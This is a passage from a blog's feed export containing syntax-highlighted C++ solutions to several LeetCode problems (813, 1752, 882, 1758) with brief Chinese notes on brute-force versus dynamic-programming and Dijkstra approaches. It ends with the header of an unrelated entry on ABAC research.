k<span class="number">-2</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = i+<span class="number">1</span>; j &lt; len<span class="number">-1</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> p = j+<span class="number">1</span>; p &lt; len; p++) &#123;</span><br><span class="line">                    left_avg[i+<span class="number">1</span>][p] = <span class="built_in">max</span>(left_avg[i][j] + <span class="built_in">double</span>(sum[p] - sum[j])/(p-j), left_avg[i+<span class="number">1</span>][p]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">double</span> maxx = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; k<span class="number">-1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; len; j++) &#123;</span><br><span class="line">                maxx = <span class="built_in">max</span>(left_avg[i][j]+<span class="built_in">double</span>(sum[len] - sum[j])/(len-j), maxx);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxx;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>减少maxx计算次数</p></blockquote><h2 id="1752-检查数组是否经排序和轮转得到"><a href="#1752-检查数组是否经排序和轮转得到" class="headerlink" title="1752. 检查数组是否经排序和轮转得到"></a><a href="https://leetcode.cn/problems/check-if-array-is-sorted-and-rotated/">1752. 检查数组是否经排序和轮转得到</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">check</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> len = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">while</span>(i &lt; len &amp;&amp; nums[i<span class="number">-1</span>] &lt;= nums[i]) i++;</span><br><span class="line">        <span class="keyword">if</span>(i == len) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        j = i+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(j &lt; len &amp;&amp; nums[j<span class="number">-1</span>] &lt;= nums[j]) j++;</span><br><span class="line">        <span class="keyword">return</span> j == len &amp;&amp; nums[len<span class="number">-1</span>] &lt;= nums[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="882-细分图中的可到达节点"><a href="#882-细分图中的可到达节点" class="headerlink" title="882. 细分图中的可到达节点"></a><a href="https://leetcode.cn/problems/reachable-nodes-in-subdivided-graph/">882. 细分图中的可到达节点</a></h2><h2 id="暴搜超时"><a href="#暴搜超时" class="headerlink" title="暴搜超时"></a>暴搜超时</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; graph;</span><br><span class="line">    vector&lt;<span class="type">bool</span>&gt; global_visited;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; copy_edges;</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">reachableNodes</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; edges, <span class="type">int</span> maxMoves, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> edge_size = edges.<span class="built_in">size</span>();</span><br><span class="line">        graph = vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;(n);</span><br><span class="line">        global_visited = <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(n, <span class="literal">false</span>);</span><br><span class="line">        copy_edges = vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;(<span class="number">2</span>,<span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(edge_size, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; edge_size; i++) &#123;</span><br><span class="line">            graph[edges[i][<span class="number">0</span>]].<span class="built_in">push_back</span>(i);</span><br><span class="line">            graph[edges[i][<span class="number">1</span>]].<span class="built_in">push_back</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">dfs</span>(std::<span class="built_in">move</span>(edges), <span class="number">0</span>, maxMoves);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; edge_size; i++) &#123;</span><br><span class="line">            res += <span class="built_in">min</span>(edges[i][<span class="number">2</span>], copy_edges[<span class="number">0</span>][i] + copy_edges[<span class="number">1</span>][i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(global_visited[i]) &#123;</span><br><span class="line">                res++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp;&amp; edges, <span class="type">int</span> node, <span class="type">int</span> move)</span> </span>&#123;</span><br><span class="line">        global_visited[node] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span>(move &lt;= <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> e : graph[node]) &#123;</span><br><span class="line">            <span class="type">int</span> w = edges[e][<span class="number">2</span>];</span><br><span class="line">            <span class="type">int</span> next = edges[e][<span class="number">0</span>] == node ? edges[e][<span class="number">1</span>] : edges[e][<span class="number">0</span>];</span><br><span class="line">            <span class="type">int</span> direction = edges[e][<span class="number">0</span>] == node ? <span class="number">0</span> : <span class="number">1</span>;</span><br><span class="line">            copy_edges[direction][e] = <span class="built_in">max</span>(<span class="built_in">min</span>(w, move), copy_edges[direction][e]);</span><br><span class="line">            <span class="keyword">if</span>(move &gt; w) &#123;</span><br><span class="line">                <span class="built_in">dfs</span>(std::<span class="built_in">move</span>(edges), next, move-w<span class="number">-1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="djikstra-题解"><a href="#djikstra-题解" class="headerlink" title="djikstra-题解"></a>djikstra-题解</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">encode</span><span class="params">(<span class="type">int</span> u, <span class="type">int</span> v, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> u * n + v;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">reachableNodes</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; edges, <span class="type">int</span> maxMoves, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        vector&lt;vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;&gt; <span class="built_in">adList</span>(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;edge : edges) &#123;</span><br><span class="line">            <span class="type">int</span> u = edge[<span class="number">0</span>], v = edge[<span class="number">1</span>], nodes = edge[<span class="number">2</span>];</span><br><span class="line">            adList[u].<span class="built_in">emplace_back</span>(v, nodes);</span><br><span class="line">            adList[v].<span class="built_in">emplace_back</span>(u, nodes);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; used;</span><br><span class="line">        unordered_set&lt;<span class="type">int</span>&gt; visited;</span><br><span class="line">        <span class="type">int</span> reachableNodes = <span class="number">0</span>;</span><br><span class="line">        priority_queue&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;, vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;, greater&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt;&gt; pq;</span><br><span class="line">        pq.<span class="built_in">emplace</span>(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span> (!pq.<span class="built_in">empty</span>() &amp;&amp; pq.<span class="built_in">top</span>().first &lt;= maxMoves) &#123;</span><br><span class="line">            <span class="keyword">auto</span> [step, u] = pq.<span class="built_in">top</span>();</span><br><span class="line">            pq.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">if</span> (visited.<span class="built_in">count</span>(u)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            visited.<span class="built_in">emplace</span>(u);</span><br><span class="line">            reachableNodes++;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">auto</span> [v, nodes] : adList[u]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nodes + step + <span class="number">1</span> &lt;= maxMoves &amp;&amp; !visited.<span class="built_in">count</span>(v)) &#123;</span><br><span class="line">                    pq.<span class="built_in">emplace</span>(nodes + step + <span class="number">1</span>, v);</span><br><span class="line">                &#125;</span><br><span class="line">                used[<span class="built_in">encode</span>(u, v, n)] = <span class="built_in">min</span>(nodes, maxMoves - step);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;edge : edges) &#123;</span><br><span class="line">            <span class="type">int</span> u = edge[<span class="number">0</span>], v = edge[<span class="number">1</span>], nodes = edge[<span class="number">2</span>];</span><br><span class="line">            reachableNodes += <span class="built_in">min</span>(nodes, used[<span class="built_in">encode</span>(u, v, n)] + used[<span class="built_in">encode</span>(v, u, n)]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> reachableNodes;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1758-生成交替二进制字符串的最少操作数&quot;&gt;&lt;a href=&quot;#1758-生成交替二进制字符串的最少操作数&quot; class=&quot;headerlink&quot; title=&quot;1758. 生成交替二进制字符串的最少操作数&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/minimum-changes-to-make-alternating-binary-string/&quot;&gt;1758. 生成交替二进制字符串的最少操作数&lt;/a&gt;&lt;/h2&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;minOperations&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(string s)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; len = s.&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;min&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;cal&lt;/span&gt;(s, len, &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;), &lt;span class=&quot;built_in&quot;&gt;cal&lt;/span&gt;(s, len, &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;cal&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;type&quot;&gt;const&lt;/span&gt; string&amp;amp; s, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; len, &lt;span class=&quot;type&quot;&gt;bool&lt;/span&gt; flag)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; count = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; len; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(flag &amp;amp;&amp;amp; s[i] == &lt;span class=&quot;string&quot;&gt;&amp;#x27;0&amp;#x27;&lt;/span&gt; || !flag &amp;amp;&amp;amp; s[i] == &lt;span class=&quot;string&quot;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                count++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            flag = !flag;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; count;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&quot;813-最大平均值和的分组&quot;&gt;&lt;a href=&quot;#813-最大平均值和的分组&quot; class=&quot;headerlink&quot; title=&quot;813. 最大平均值和的分组&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/largest-sum-of-averages/&quot;&gt;813. 最大平均值和的分组&lt;/a&gt;&lt;/h2&gt;&lt;h3 id=&quot;超时暴搜&quot;&gt;&lt;a href=&quot;#超时暴搜&quot; class=&quot;headerlink&quot; title=&quot;超时暴搜&quot;&gt;&lt;/a&gt;超时暴搜&lt;/h3&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; len = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    vector&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt; sum;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;largestSumOfAverages&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(vector&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;&amp;amp; nums, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; k)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        len = nums.&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        sum = &lt;span class=&quot;built_in&quot;&gt;vector&lt;/span&gt;&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;(len+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;; i &amp;lt;= len; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            sum[i] = nums[i&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;] + sum[i&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;search&lt;/span&gt;(nums, k, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(vector&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;&amp;amp; nums, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; k, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; K, &lt;span class=&quot;type&quot;&gt;double&lt;/span&gt; left_value, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; last_j)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(k == K || i == len) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; left_value + (sum[len] - sum[last_j] + &lt;span class=&quot;number&quot;&gt;0.0&lt;/span&gt;) / (len - last_j);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;max&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;search&lt;/span&gt;(nums, k, i+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, K+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, left_value + (sum[i] - sum[last_j] + &lt;span class=&quot;number&quot;&gt;0.0&lt;/span&gt;)/(i-last_j), i), &lt;span class=&quot;built_in&quot;&gt;search&lt;/span&gt;(nums, k,i+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, K, left_value, last_j));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;max&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;type&quot;&gt;double&lt;/span&gt; a, &lt;span class=&quot;type&quot;&gt;double&lt;/span&gt; b)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; a &amp;gt; b ? a : b;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;blockquote&gt;
&lt;p&gt;昨天第一个思路是用排序，找出最大的m个数，这m个数恰好将数组分成k个部分，发现不可行。&lt;br&gt;然后暴力搜索，超时了，暴搜时考虑添加隔板，其中left_value表示当前搜索下标i之前的分组平均值&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>ABAC 调研</title>
    <link href="https://jingtianer.github.io/home/2022/11/22/%E7%BB%84%E4%BC%9A/ABAC/"/>
    <id>https://jingtianer.github.io/home/2022/11/22/%E7%BB%84%E4%BC%9A/ABAC/</id>
    <published>2022-11-22T04:15:37.000Z</published>
    <updated>2022-11-24T07:11:39.318Z</updated>
    
